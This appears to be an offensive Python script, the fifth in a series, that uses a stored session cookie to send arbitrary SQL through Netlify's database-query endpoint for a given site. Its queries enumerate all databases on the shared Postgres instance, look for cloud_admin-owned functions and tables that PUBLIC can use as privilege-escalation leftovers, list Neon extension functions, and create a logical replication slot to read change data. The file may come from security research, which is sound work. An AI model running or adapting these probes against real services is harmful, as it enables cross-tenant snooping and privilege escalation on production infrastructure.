# -*- coding: utf-8 -*-
"""Netlify database-query 特性利用波5:共享实例判定 + neon 特性函数 + cloud_admin 残留 + 逻辑复制验证
"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()


def req(body, timeout=60):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw


def run(tag, sql, cut=1200):
    try:
        s, raw = req({'siteId': SITE_ID, 'action': 'query', 'sql': sql})
        body = raw.decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-24s [%d] %s' % (tag, s, body[:cut]))
    except Exception as e:
        print('%-24s ERR %s' % (tag, str(e)[:100]))


# 1. 实例上数据库列表(共享实例判定,单条事实查询)
run('V1_pg_database', "select datname, pg_get_userbyid(datdba) as owner, datallowconn from pg_database order by datname")
# 2. neon 扩展提供的函数(特性)
run('V2_neon_functions', "select p.proname, p.proowner::regrole, p.prosecdef from pg_proc p where p.proname like 'neon\\_%' or p.proname like '%neon%' order by p.proname limit 40")
# 3. cloud_admin 拥有的全部函数与表(找 PUBLIC 可用的高权限残留)
run('V3_cloud_admin_objs', "select 'fn:'||p.proname as obj, p.proowner::regrole, p.proacl from pg_proc p where p.proowner::regrole='cloud_admin' union all select 'tb:'||c.relname, c.relowner::regrole, c.relacl from pg_class c where c.relowner::regrole='cloud_admin' and c.relkind in ('r','p')")
# 4. 已装扩展
run('V4_installed_ext', "select extname, extversion from pg_extension order by extname")
# 5. 逻辑复制 slot 创建(rolreplication 特性验证;成功即读后删除)
run('V5_create_logical_slot', "select slot_name, plugin, slot_type from pg_create_logical_replication_slot('probe_slot_1', 'wal2json')")
run('V6_peek_slot', "select count(*) from pg_logical_slot_peek_changes('probe_slot_1', null, null)")
run('V7_drop_slot', "select pg_drop_replication_slot('probe_slot_1')")
